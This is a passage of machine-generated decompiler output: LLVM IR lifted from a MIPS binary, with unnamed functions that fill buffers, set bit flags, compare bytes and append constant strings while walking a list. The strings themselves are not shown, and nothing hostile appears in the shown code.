  %v2_403090 = ptrtoint i32* %stack_var_-2116 to i32
  store i32 %v2_403090, i32* %v1.global-to-local, align 4
  %v5_40309c = ptrtoint i32* %stack_var_-2336 to i32
  br label %dec_label_pc_403094

dec_label_pc_403094:                              ; preds = %dec_label_pc_403094, %dec_label_pc_403080
  %v0_403094 = phi i32 [ %v1_403098, %dec_label_pc_403094 ], [ %v2_403088, %dec_label_pc_403080 ]
  %v1_403094 = inttoptr i32 %v0_403094 to i32*
  store i32 0, i32* %v1_403094, align 4
  %v0_403098 = load i32, i32* %v0.global-to-local, align 4
  %v1_403098 = add i32 %v0_403098, 4
  store i32 %v1_403098, i32* %v0.global-to-local, align 4
  %v1_40309c = load i32, i32* %v1.global-to-local, align 4
  %v2_40309c = icmp eq i32 %v1_403098, %v1_40309c
  store i32 %v5_40309c, i32* @s1, align 4
  br i1 %v2_40309c, label %dec_label_pc_4030a0, label %dec_label_pc_403094

dec_label_pc_4030a0:                              ; preds = %dec_label_pc_403094
  %v0_4030a4 = load i32, i32* @s2, align 4
  %v1_4030a4 = add i32 %v0_4030a4, 8
  %v2_4030a4 = inttoptr i32 %v1_4030a4 to i32*
  %v3_4030a4 = load i32, i32* %v2_4030a4, align 4
  store i32 %v3_4030a4, i32* %a0.global-to-local, align 4
  %v1_4030ac = udiv i32 %v3_4030a4, 32
  %v1_4030b0 = mul nuw nsw i32 %v1_4030ac, 4
  %v2_4030b4 = add i32 %v1_4030b0, %v5_40309c
  store i32 %v2_4030b4, i32* %v1.global-to-local, align 4
  %v1_4030b8 = add i32 %v2_4030b4, 92
  %v2_4030b8 = inttoptr i32 %v1_4030b8 to i32*
  %v3_4030b8 = load i32, i32* %v2_4030b8, align 4
  store i32 1, i32* @s0, align 4
  %v2_4030c0 = shl i32 1, %v3_4030a4
  %v2_4030c4 = or i32 %v3_4030b8, %v2_4030c0
  %v3_4030cc = load i32, i32* @global_var_449bf0.121, align 4
  store i32 %v3_4030cc, i32* @t9, align 4
  %v2_4030d4 = ptrtoint i32* %stack_var_-2328 to i32
  store i32 %v2_4030d4, i32* %v0.global-to-local, align 4
  store i32 %v2_4030c4, i32* %v2_4030b8, align 4
  store i32 0, i32* %stack_var_-2328, align 4
  %v0_4030e4 = load i32, i32* %a0.global-to-local, align 4
  %v1_4030e4 = add i32 %v0_4030e4, 1
  store i32 %v1_4030e4, i32* %a0.global-to-local, align 4
  %v4_4030ec = call i32 @function_405110(i32 %v1_4030e4, i32 0, i32 0)
  store i32 %v4_4030ec, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v1_4030f8 = load i32, i32* @s0, align 4
  %v2_4030f8 = icmp eq i32 %v4_4030ec, %v1_4030f8
  store i32 %v2_4030d4, i32* %v1.global-to-local, align 4
  br i1 %v2_4030f8, label %dec_label_pc_4030fc, label %dec_label_pc_403180.thread

dec_label_pc_403180.thread:                       ; preds = %dec_label_pc_4030a0
  store i32 -1, i32* %v0.global-to-local, align 4
  %v0_40318c.pre = load i32, i32* @s2, align 4
  br label %dec_label_pc_403188

dec_label_pc_4030fc:                              ; preds = %dec_label_pc_4030a0
  store i32 4, i32* %v0.global-to-local, align 4
  %v0_403104 = load i32, i32* @s2, align 4
  %v1_403104 = add i32 %v0_403104, 8
  %v2_403104 = inttoptr i32 %v1_403104 to i32*
  %v3_403104 = load i32, i32* %v2_403104, align 4
  store i32 %v3_403104, i32* %a0.global-to-local, align 4
  %v3_403108 = load i32, i32* @global_var_449ae0.108, align 4
  store i32 %v3_403108, i32* @t9, align 4
  store i32 4, i32* %stack_var_-2332, align 4
  %v2_403110 = ptrtoint i32* %stack_var_-2332 to i32
  store i32 %v2_403110, i32* %v0.global-to-local, align 4
  store i32 0, i32* %stack_var_-2336, align 4
  store i32 %v5_40309c, i32* @a3, align 4
  %v6_403124 = call i32 @function_405cb0(i32 %v3_403104, i32 65535, i32 4103)
  %v3_40312c = load i32, i32* %stack_var_-2336, align 4
  store i32 %v3_40312c, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v1_403134 = icmp eq i32 %v3_40312c, 0
  br i1 %v1_403134, label %dec_label_pc_403180, label %dec_label_pc_403ba4

dec_label_pc_403180:                              ; preds = %dec_label_pc_4030fc
  %v0_40313c = load i32, i32* @s2, align 4
  %v1_40313c = add i32 %v0_40313c, 8
  %v2_40313c = inttoptr i32 %v1_40313c to i32*
  %v3_40313c = load i32, i32* %v2_40313c, align 4
  store i32 %v3_40313c, i32* @s0, align 4
  %v3_403140 = load i32, i32* @global_var_449a74.80, align 4
  store i32 %v3_403140, i32* @t9, align 4
  store i32 %v3_40313c, i32* @a0, align 4
  store i32 3, i32* @a1, align 4
  %v1_40314c = call i32 @function_404bc0()
  store i32 %v1_40314c, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v3_40315c = load i32, i32* @global_var_449a74.80, align 4
  store i32 %v3_40315c, i32* @t9, align 4
  %v0_403160 = load i32, i32* @s0, align 4
  store i32 %v0_403160, i32* @a0, align 4
  store i32 4, i32* @a1, align 4
  %v4_403168 = call i32 @function_404bc0()
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_403174 = load i32, i32* @s2, align 4
  store i32 %v0_403174, i32* %a0.global-to-local, align 4
  %v0_403184.pr = load i32, i32* @v1, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  %v2_403184 = icmp eq i32 %v0_403184.pr, -1
  br i1 %v2_403184, label %dec_label_pc_403ba4, label %dec_label_pc_403188

dec_label_pc_403188:                              ; preds = %dec_label_pc_403180.thread, %dec_label_pc_403180
  %v3_4031d8 = phi i32 [ %v0_40318c.pre, %dec_label_pc_403180.thread ], [ %v0_403174, %dec_label_pc_403180 ]
  store i32 %v3_4031d8, i32* %a0.global-to-local, align 4
  %v0_40319c = load i32, i32* @s6, align 4
  %v2_40319c = icmp eq i32 %v0_40319c, 2
  store i32 3, i32* %v0.global-to-local, align 4
  br i1 %v2_40319c, label %dec_label_pc_4031b0.thread, label %dec_label_pc_4031b0

dec_label_pc_4031b0.thread:                       ; preds = %dec_label_pc_403188
  store i32 %v3_4031d8, i32* %a0.global-to-local, align 4
  store i32 1, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4031c4.thread

dec_label_pc_4031b0:                              ; preds = %dec_label_pc_403188
  %v2_4031b0 = icmp eq i32 %v0_40319c, 3
  store i32 1, i32* %v0.global-to-local, align 4
  br i1 %v2_4031b0, label %dec_label_pc_4031b4, label %dec_label_pc_4031c4

dec_label_pc_4031b4:                              ; preds = %dec_label_pc_4031b0
  store i32 %v3_4031d8, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_4031c4.thread

dec_label_pc_4031c4.thread:                       ; preds = %dec_label_pc_4031b0.thread, %dec_label_pc_4031b4
  store i32 4, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_4031d8.thread

dec_label_pc_4031c4:                              ; preds = %dec_label_pc_4031b0
  %v2_4031c4 = icmp eq i32 %v0_40319c, 1
  store i32 4, i32* %v0.global-to-local, align 4
  br i1 %v2_4031c4, label %dec_label_pc_4031c8, label %dec_label_pc_4031d8

dec_label_pc_4031c8:                              ; preds = %dec_label_pc_4031c4
  store i32 %v3_4031d8, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_4031d8.thread

dec_label_pc_4031d8.thread:                       ; preds = %dec_label_pc_4031c4.thread, %dec_label_pc_4031c8
  store i32 %v3_4031d8, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_4031e8

dec_label_pc_4031d8:                              ; preds = %dec_label_pc_4031c4
  %v2_4031d8 = icmp eq i32 %v0_40319c, 4
  store i32 %v3_4031d8, i32* %a0.global-to-local, align 4
  br i1 %v2_4031d8, label %dec_label_pc_4031dc, label %dec_label_pc_4031e8

dec_label_pc_4031dc:                              ; preds = %dec_label_pc_4031d8
  br label %dec_label_pc_4031e8

dec_label_pc_4031e8:                              ; preds = %dec_label_pc_4031d8.thread, %dec_label_pc_4031d8, %dec_label_pc_402ce8, %dec_label_pc_4028c8, %dec_label_pc_4031dc
  %stack_var_-64.1 = phi i32 [ %tmp75, %dec_label_pc_4028c8 ], [ %stack_var_-64.0, %dec_label_pc_4031dc ], [ %stack_var_-64.0, %dec_label_pc_4031d8 ], [ %tmp75, %dec_label_pc_402ce8 ], [ %stack_var_-64.0, %dec_label_pc_4031d8.thread ]
  %stack_var_-56.3 = phi i32 [ %tmp76, %dec_label_pc_4028c8 ], [ %stack_var_-56.2, %dec_label_pc_4031dc ], [ %stack_var_-56.2, %dec_label_pc_4031d8 ], [ %stack_var_-56.0, %dec_label_pc_402ce8 ], [ %stack_var_-56.2, %dec_label_pc_4031d8.thread ]
  %stack_var_-52.3 = phi i32 [ %tmp77, %dec_label_pc_4028c8 ], [ %stack_var_-52.2, %dec_label_pc_4031dc ], [ %stack_var_-52.2, %dec_label_pc_4031d8 ], [ %stack_var_-52.0, %dec_label_pc_402ce8 ], [ %stack_var_-52.2, %dec_label_pc_4031d8.thread ]
  %v1_4031e8 = add i32 %v1_402868, 291416
  %v2_4031e8 = inttoptr i32 %v1_4031e8 to i32*
  %v3_4031e8 = load i32, i32* %v2_4031e8, align 4
  store i32 0, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v3_4031e8)
  %v0_4031f8 = load i32, i32* @s2, align 4
  %v1_4031f8 = add i32 %v0_4031f8, 17
  %v2_4031f8 = inttoptr i32 %v1_4031f8 to i8*
  %v3_4031f8 = load i8, i8* %v2_4031f8, align 1
  %v4_4031f8 = zext i8 %v3_4031f8 to i32
  store i32 %v4_4031f8, i32* %v1.global-to-local, align 4
  %v2_403200 = icmp eq i8 %v3_4031f8, 2
  store i32 3, i32* @v0, align 4
  br i1 %v2_403200, label %dec_label_pc_403214.thread, label %dec_label_pc_403214

dec_label_pc_403214.thread:                       ; preds = %dec_label_pc_4031e8
  store i32 %v0_4031f8, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_403228

dec_label_pc_403214:                              ; preds = %dec_label_pc_4031e8
  %v2_403214 = icmp eq i8 %v3_4031f8, 3
  br i1 %v2_403214, label %dec_label_pc_403218, label %dec_label_pc_403228

dec_label_pc_403218:                              ; preds = %dec_label_pc_403214
  store i32 %v0_4031f8, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_403228

dec_label_pc_403228:                              ; preds = %dec_label_pc_403214.thread, %dec_label_pc_403214, %dec_label_pc_403218
  %v0_403228 = load i32, i32* %gp.global-to-local, align 4
  %v1_40322c = add i32 %v0_403228, -32224
  %v2_40322c = inttoptr i32 %v1_40322c to i32*
  %v3_40322c = load i32, i32* %v2_40322c, align 4
  %v1_403230 = add i32 %v0_4031f8, 8
  %v2_403230 = inttoptr i32 %v1_403230 to i32*
  %v3_403230 = load i32, i32* %v2_403230, align 4
  store i32 %v3_403230, i32* %a0.global-to-local, align 4
  store i32 16384, i32* @a3, align 4
  call void @__pseudo_call(i32 %v3_40322c)
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_403244 = load i32, i32* @v0, align 4
  %v1_403244 = icmp slt i32 %v0_403244, 1
  br i1 %v1_403244, label %dec_label_pc_403ba4, label %dec_label_pc_403248

dec_label_pc_403248:                              ; preds = %dec_label_pc_403228
  %v0_40324c = load i32, i32* @s2, align 4
  %v3_40325c = load i32, i32* @global_var_4499d0.88, align 4
  %v1_403264 = add i32 %v3_40325c, 9656
  store i32 %v0_40324c, i32* %a0.global-to-local, align 4
  call void @__pseudo_call(i32 %v1_403264)
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_403274 = load i32, i32* @v0, align 4
  %v1_403274 = icmp eq i32 %v0_403274, 0
  store i32 %v0_403274, i32* %s5.global-to-local, align 4
  br i1 %v1_403274, label %dec_label_pc_403248.dec_label_pc_4037d0_crit_edge, label %dec_label_pc_403278

dec_label_pc_403248.dec_label_pc_4037d0_crit_edge: ; preds = %dec_label_pc_403248
  %v0_4037d0.pre = load i32, i32* @s2, align 4
  %.pre = ptrtoint i32* %stack_var_-1092 to i32
  br label %dec_label_pc_4037d0

dec_label_pc_403278:                              ; preds = %dec_label_pc_403248
  %v3_40327c = load i32, i32* @global_var_449bac.120, align 4
  store i32 %v3_40327c, i32* @t9, align 4
  store i32 4, i32* %a0.global-to-local, align 4
  %v5_403284 = call i32 @function_406330(i64 4, i32 4)
  store i32 %v5_403284, i32* @v0, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_403290 = load i32, i32* @s2, align 4
  %v1_403290 = add i32 %v0_403290, 18
  store i32 %v1_403290, i32* %s3.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_40955c.148 to i32), i32* %v1.global-to-local, align 4
  %v2_4032b0 = add i32 %v0_403290, 1044
  %v3_4032b0 = inttoptr i32 %v2_4032b0 to i32*
  store i32 %v5_403284, i32* %v3_4032b0, align 4
  %v0_4032b4 = load i32, i32* %s3.global-to-local, align 4
  store i32 %v0_4032b4, i32* %a0.global-to-local, align 4
  store i8 4, i8* %stack_var_-2320, align 1
  %v5_4032bc = call i32 @function_403e84()
  store i32 %v5_4032bc, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 %v0_4032b4, i32* %a0.global-to-local, align 4
  %v3_4032cc = load i32, i32* @global_var_449c48.123, align 4
  store i32 %v3_4032cc, i32* @t9, align 4
  %v2_4032d4 = load i32, i32* %s5.global-to-local, align 4
  %v3_4032d4 = add i32 %v2_4032d4, %v0_4032b4
  %v7_4032d4 = call i32 @function_405800(i32 %v0_4032b4, i32 %v3_4032d4, i32 %v5_4032bc)
  store i32 %v7_4032d4, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v2_4032e4 = ptrtoint i8* %stack_var_-2320 to i32
  store i32 %v2_4032e4, i32* %s4.global-to-local, align 4
  %v4_40331c = ptrtoint i32* %stack_var_-2312 to i32
  %v0_4032e8.pre = load i32, i32* @s0, align 4
  br label %dec_label_pc_4032e8

dec_label_pc_4032e8:                              ; preds = %dec_label_pc_403310, %dec_label_pc_403278
  %v0_403300 = phi i32 [ %v1_403314, %dec_label_pc_403310 ], [ %v0_4032e8.pre, %dec_label_pc_403278 ]
  %v1_4032e8 = inttoptr i32 %v0_403300 to i8*
  %v2_4032e8 = load i8, i8* %v1_4032e8, align 1
  %v3_4032e8 = sext i8 %v2_4032e8 to i32
  store i32 %v3_4032e8, i32* %v1.global-to-local, align 4
  %v2_4032ec = load i8, i8* %stack_var_-2320, align 1
  %v3_4032ec = sext i8 %v2_4032ec to i32
  store i32 %v3_4032ec, i32* %v0.global-to-local, align 4
  %v2_4032f4 = icmp eq i8 %v2_4032e8, %v2_4032ec
  store i32 %v0_403300, i32* %a0.global-to-local, align 4
  br i1 %v2_4032f4, label %dec_label_pc_4032f8, label %dec_label_pc_403310

dec_label_pc_4032f8:                              ; preds = %dec_label_pc_4032e8
  %v3_4032fc = load i32, i32* @global_var_449c48.123, align 4
  store i32 %v3_4032fc, i32* @t9, align 4
  %v1_403300 = add i32 %v0_403300, 1
  %v1_403304 = load i32, i32* %s5.global-to-local, align 4
  %v2_403304 = load i32, i32* @s1, align 4
  %v3_403304 = sub i32 %v1_403304, %v2_403304
  %v7_403304 = call i32 @function_405800(i32 %v0_403300, i32 %v1_403300, i32 %v3_403304)
  store i32 %v7_403304, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_403314.pre = load i32, i32* @s0, align 4
  br label %dec_label_pc_403310

dec_label_pc_403310:                              ; preds = %dec_label_pc_4032e8, %dec_label_pc_4032f8
  %v0_403314 = phi i32 [ %v0_403300, %dec_label_pc_4032e8 ], [ %v0_403314.pre, %dec_label_pc_4032f8 ]
  %v0_403310 = load i32, i32* @s1, align 4
  %v1_403310 = add i32 %v0_403310, 1
  store i32 %v1_403310, i32* @s1, align 4
  %v1_403314 = add i32 %v0_403314, 1
  store i32 %v1_403314, i32* @s0, align 4
  %v1_403318 = load i32, i32* %s5.global-to-local, align 4
  %v2_403318 = icmp slt i32 %v1_403310, %v1_403318
  store i32 %v4_40331c, i32* @v0, align 4
  br i1 %v2_403318, label %dec_label_pc_4032e8, label %dec_label_pc_40333c

dec_label_pc_40333c:                              ; preds = %dec_label_pc_403310
  %v2_403324 = ptrtoint i32* %stack_var_-2319 to i32
  store i32 %v2_403324, i32* %s4.global-to-local, align 4
  %v3_403328 = load i32, i32* %s3.global-to-local, align 4
  store i32 %v3_403328, i32* %s0.global-to-local, align 4
  store i32 0, i32* @s1, align 4
  %v0_403344.pre = load i32, i32* @t9, align 4
  br label %dec_label_pc_403344

dec_label_pc_403344:                              ; preds = %dec_label_pc_403344.dec_label_pc_403344_crit_edge, %dec_label_pc_40333c
  %v2_403344 = phi i32 [ %v3_4033c4, %dec_label_pc_403344.dec_label_pc_403344_crit_edge ], [ %v4_40331c, %dec_label_pc_40333c ]
  %v1_403344 = phi i32 [ %v1_403344.pre, %dec_label_pc_403344.dec_label_pc_403344_crit_edge ], [ %v2_403324, %dec_label_pc_40333c ]
  %v0_403344 = phi i32 [ %v3_4033c0, %dec_label_pc_403344.dec_label_pc_403344_crit_edge ], [ %v0_403344.pre, %dec_label_pc_40333c ]
  %v3_403344 = add i32 %v1_403344, %v2_403344
  store i32 %v3_403344, i32* @s0, align 4
  call void @__pseudo_call(i32 %v0_403344)
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_403350 = load i32, i32* @v0, align 4
  %v1_403350 = add i32 %v0_403350, 1
  store i32 %v1_403350, i32* %a0.global-to-local, align 4
  %v3_403354 = load i32, i32* @global_var_449c08.14, align 4
  store i32 %v3_403354, i32* @t9, align 4
  store i32 0, i32* %s3.global-to-local, align 4
  %v2_40335c = call i32 @function_406140(i32 %v1_403350)
  store i32 %v2_40335c, i32* @v0, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_403368 = load i32, i32* @s2, align 4
  %v1_403368 = add i32 %v0_403368, 1044
  %v2_403368 = inttoptr i32 %v1_403368 to i32*
  %v3_403368 = load i32, i32* %v2_403368, align 4
  %v1_403370 = load i32, i32* %s4.global-to-local, align 4
  %v2_403370 = add i32 %v1_403370, %v3_403368
  store i32 %v2_403370, i32* %v1.global-to-local, align 4
  %v1_403374 = load i32, i32* @s0, align 4
  %v2_403374 = inttoptr i32 %v1_403374 to i32*
  store i32 %v2_40335c, i32* %v2_403374, align 4
  %v0_403378 = load i32, i32* %v1.global-to-local, align 4
  %v1_403378 = inttoptr i32 %v0_403378 to i32*
  %v2_403378 = load i32, i32* %v1_403378, align 4
  store i32 %v2_403378, i32* %s0.global-to-local, align 4
  %v1_40337c = load i32, i32* @s1, align 4
  store i32 %v1_40337c, i32* %a0.global-to-local, align 4
  %v2_40337c = call i32 @function_403e84()
  store i32 %v2_40337c, i32* @v0, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_403388 = load i32, i32* %s0.global-to-local, align 4
  store i32 %v0_403388, i32* %a0.global-to-local, align 4
  %v0_403390 = load i32, i32* @s1, align 4
  store i32 %v2_40337c, i32* @a2, align 4
  %v5_403394 = call i32 @function_403edc(i32 %v0_403388, i32 %v0_403390, i32 %v2_40337c)
  store i32 %v5_403394, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_4033a0 = load i32, i32* %s4.global-to-local, align 4
  %v1_4033a0 = add i32 %v0_4033a0, 4
  store i32 %v1_4033a0, i32* %s4.global-to-local, align 4
  %v3_4033a8 = load i32, i32* @global_var_449c04.149, align 4
  store i32 %v3_4033a8, i32* @t9, align 4
  %v0_4033ac = load i32, i32* %s3.global-to-local, align 4
  store i32 %v0_4033ac, i32* @a0, align 4
  %v5_4033b0 = inttoptr i32 %v0_4033ac to i8*
  %v6_4033b0 = call i32 @function_403f98(i8* %v5_4033b0, i32 ptrtoint (i32* @global_var_4086d0.150 to i32))
  store i32 %v6_4033b0, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 %v6_4033b0, i32* @s1, align 4
  %v3_4033c0 = load i32, i32* @global_var_449b8c.51, align 4
  %v0_4033c4 = load i32, i32* @s2, align 4
  %v1_4033c4 = add i32 %v0_4033c4, 1044
  %v2_4033c4 = inttoptr i32 %v1_4033c4 to i32*
  %v3_4033c4 = load i32, i32* %v2_4033c4, align 4
  store i32 %v3_4033c4, i32* @v0, align 4
  %v1_4033c8 = icmp eq i32 %v6_4033b0, 0
  store i32 %v6_4033b0, i32* %a0.global-to-local, align 4
  br i1 %v1_4033c8, label %dec_label_pc_4033cc, label %dec_label_pc_403344.dec_label_pc_403344_crit_edge

dec_label_pc_403344.dec_label_pc_403344_crit_edge: ; preds = %dec_label_pc_403344
  %v1_403344.pre = load i32, i32* %s4.global-to-local, align 4
  br label %dec_label_pc_403344

dec_label_pc_4033cc:                              ; preds = %dec_label_pc_403344
  %v1_4033d0 = add i32 %v3_4033c4, 4
  %v2_4033d0 = inttoptr i32 %v1_4033d0 to i32*
  %v3_4033d0 = load i32, i32* %v2_4033d0, align 4
  store i32 %v3_4033d0, i32* @s0, align 4
  store i32 %v3_4033d0, i32* %a0.global-to-local, align 4
  %v2_4033d4 = call i32 @function_403e84()
  store i32 %v2_4033d4, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_4033e0 = load i32, i32* @s0, align 4
  store i32 %v0_4033e0, i32* %a0.global-to-local, align 4
  %v3_4033e4 = load i32, i32* @global_var_449c48.123, align 4
  store i32 %v3_4033e4, i32* @t9, align 4
  %v2_4033ec = add i32 %v0_4033e0, 12
  %v6_4033ec = call i32 @function_405800(i32 %v0_4033e0, i32 %v2_4033ec, i32 %v2_4033d4)
  store i32 %v6_4033ec, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_4033f8 = load i32, i32* @s2, align 4
  %v1_4033f8 = add i32 %v0_4033f8, 1044
  %v2_4033f8 = inttoptr i32 %v1_4033f8 to i32*
  %v3_4033f8 = load i32, i32* %v2_4033f8, align 4
  store i32 %v3_4033f8, i32* %v0.global-to-local, align 4
  %v3_4033fc = load i32, i32* @global_var_4499d0.88, align 4
  store i32 %v3_4033fc, i32* %v1.global-to-local, align 4
  %v1_403400 = icmp eq i32 %v3_4033f8, 0
  br i1 %v1_403400, label %dec_label_pc_4033cc.dec_label_pc_403aac_crit_edge, label %dec_label_pc_403404

dec_label_pc_4033cc.dec_label_pc_403aac_crit_edge: ; preds = %dec_label_pc_4033cc
  %.pre60 = ptrtoint i32* %stack_var_-1092 to i32
  br label %dec_label_pc_403aac

dec_label_pc_403404:                              ; preds = %dec_label_pc_4033cc
  %v2_40341c = ptrtoint i32* %stack_var_-1092 to i32
  %v7_403444 = bitcast i32* %stack_var_-1092 to i8*
  br label %dec_label_pc_403410

dec_label_pc_403410:                              ; preds = %dec_label_pc_4034e4, %dec_label_pc_403404
  %v0_403414 = phi i32 [ %v3_4033fc, %dec_label_pc_403404 ], [ %v0_4034f8, %dec_label_pc_4034e4 ]
  store i32 1024, i32* @a2, align 4
  store i32 %v2_40341c, i32* @a0, align 4
  %v6_403428 = call i32 @function_403f6c(i32 %v2_40341c, i32 0, i32 1024)
  store i32 %v6_403428, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 %v2_40341c, i32* %a0.global-to-local, align 4
  %v3_40343c = load i32, i32* @global_var_449ac8.59, align 4
  store i32 %v3_40343c, i32* @t9, align 4
  %v8_403444 = call i32 @function_403f08(i8* %v7_403444, i32 ptrtoint ([27 x i8]* @global_var_4086d4.151 to i32))
  store i32 %v8_403444, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_403450 = load i32, i32* @s2, align 4
  %v1_403450 = add i32 %v0_403450, 1044
  %v2_403450 = inttoptr i32 %v1_403450 to i32*
  %v3_403450 = load i32, i32* %v2_403450, align 4
  store i32 %v3_403450, i32* %v0.global-to-local, align 4
  %v1_403458 = inttoptr i32 %v3_403450 to i32*
  %v2_403458 = load i32, i32* %v1_403458, align 4
  store i32 %v2_403458, i32* @a1, align 4
  store i32 %v2_40341c, i32* %a0.global-to-local, align 4
  %v6_40345c = call i32 @function_403ea8(i8* %v7_403444, i32 %v2_403458)
  store i32 %v6_40345c, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 %v2_40341c, i32* %a0.global-to-local, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_4086f0.152 to i32), i32* @a1, align 4
  %v8_403478 = call i32 @function_403ea8(i8* %v7_403444, i32 ptrtoint ([11 x i8]* @global_var_4086f0.152 to i32))
  store i32 %v8_403478, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_403484 = load i32, i32* @s2, align 4
  %v1_403484 = add i32 %v0_403484, 1044
  %v2_403484 = inttoptr i32 %v1_403484 to i32*
  %v3_403484 = load i32, i32* %v2_403484, align 4
  store i32 %v3_403484, i32* %v0.global-to-local, align 4
  %v1_40348c = add i32 %v3_403484, 4
  %v2_40348c = inttoptr i32 %v1_40348c to i32*
  %v3_40348c = load i32, i32* %v2_40348c, align 4
  store i32 %v3_40348c, i32* @a1, align 4
  store i32 %v2_40341c, i32* %a0.global-to-local, align 4
  %v6_403490 = call i32 @function_403ea8(i8* %v7_403444, i32 %v3_40348c)
  store i32 %v6_403490, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 %v2_40341c, i32* %a0.global-to-local, align 4
  store i32 ptrtoint ([88 x i8]* @global_var_4086fc.153 to i32), i32* @a1, align 4
  %v8_4034ac = call i32 @function_403ea8(i8* %v7_403444, i32 ptrtoint ([88 x i8]* @global_var_4086fc.153 to i32))
  store i32 %v8_4034ac, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_4034b8 = load i32, i32* @s2, align 4
  %v1_4034b8 = add i32 %v0_4034b8, 1042
  %v2_4034b8 = inttoptr i32 %v1_4034b8 to i8*
  %v3_4034b8 = load i8, i8* %v2_4034b8, align 1
  %v4_4034b8 = zext i8 %v3_4034b8 to i32
  %v1_4034c0 = add nuw nsw i32 %v4_4034b8, 1
  store i32 %v1_4034c0, i32* %v0.global-to-local, align 4
  %v3_4034c4 = load i32, i32* @global_var_449cd8.142, align 4
  store i32 %v3_4034c4, i32* %v1.global-to-local, align 4
  %v1_4034c8 = urem i32 %v1_4034c0, 256
  store i32 %v1_4034c8, i32* %a0.global-to-local, align 4
  br label %dec_label_pc_4034d4

dec_label_pc_4034d4:                              ; preds = %dec_label_pc_4034f8, %dec_label_pc_403410
  %v0_4034f8 = phi i32 [ %v3_4034f8, %dec_label_pc_4034f8 ], [ %v3_4034c4, %dec_label_pc_403410 ]
  %v1_4034d4 = inttoptr i32 %v0_4034f8 to i32*
  %v2_4034d4 = load i32, i32* %v1_4034d4, align 4
  %v2_4034dc = and i32 %v2_4034d4, -256
  store i32 %v2_4034dc, i32* %v0.global-to-local, align 4
  %v1_4034e0 = icmp eq i32 %v2_4034dc, 0
  br i1 %v1_4034e0, label %dec_label_pc_4034f8, label %dec_label_pc_4034e4

dec_label_pc_4034e4:                              ; preds = %dec_label_pc_4034d4
  %v1_4034e8 = add i32 %v0_4034f8, 2
  %v2_4034e8 = inttoptr i32 %v1_4034e8 to i8*
  %v3_4034e8 = load i8, i8* %v2_4034e8, align 1
  %v4_4034e8 = zext i8 %v3_4034e8 to i32
  store i32 %v4_4034e8, i32* %v0.global-to-local, align 4
  %v2_4034f0 = icmp eq i32 %v4_4034e8, %v1_4034c8
  br i1 %v2_4034f0, label %dec_label_pc_403410, label %dec_label_pc_4034f8

dec_label_pc_4034f8:                              ; preds = %dec_label_pc_4034e4, %dec_label_pc_4034d4
  %v1_4034f8 = add i32 %v0_4034f8, 8
  %v2_4034f8 = inttoptr i32 %v1_4034f8 to i32*
  %v3_4034f8 = load i32, i32* %v2_4034f8, align 4
  store i32 %v3_4034f8, i32* %v1.global-to-local, align 4
  %v1_403500 = icmp eq i32 %v3_4034f8, 0
  br i1 %v1_403500, label %dec_label_pc_403504, label %dec_label_pc_4034d4

dec_label_pc_403504:                              ; preds = %dec_label_pc_4034f8
  store i32 %v0_403414, i32* %v0.global-to-local, align 4
  %v1_403514 = add i32 %v0_403414, 4
  %v2_403514 = inttoptr i32 %v1_403514 to i32*
  %v3_403514 = load i32, i32* %v2_403514, align 4
  store i32 %v3_403514, i32* @a1, align 4
  store i32 %v2_40341c, i32* %a0.global-to-local, align 4
  %v6_403518 = call i32 @function_403ea8(i8* %v7_403444, i32 %v3_403514)
  store i32 %v6_403518, i32* %v0.global-to-local, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  store i32 %v2_40341c, i32* %a0.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_408754.154 to i32), i32* @a1, align 4
  %v8_403534 = call i32 @function_403ea8(i8* %v7_403444, i32 ptrtoint ([17 x i8]* @global_var_408754.154 to i32))
  store i32 %v8_403534, i32* @v0, align 4
  store i32 %v2_402868, i32* %gp.global-to-local, align 4
  %v0_403548 = load i32, i32* @s2, align 4
  %v1_403548 = add i32 %v0_403548, 8
  %v2_403548 = inttoptr i32 %v1_403548 to i32*
  %v3_403548 = load i32, i32* %v2_403548, align 4
  store i32 %v3_403548, i32* %s1.global-to-local, align 4
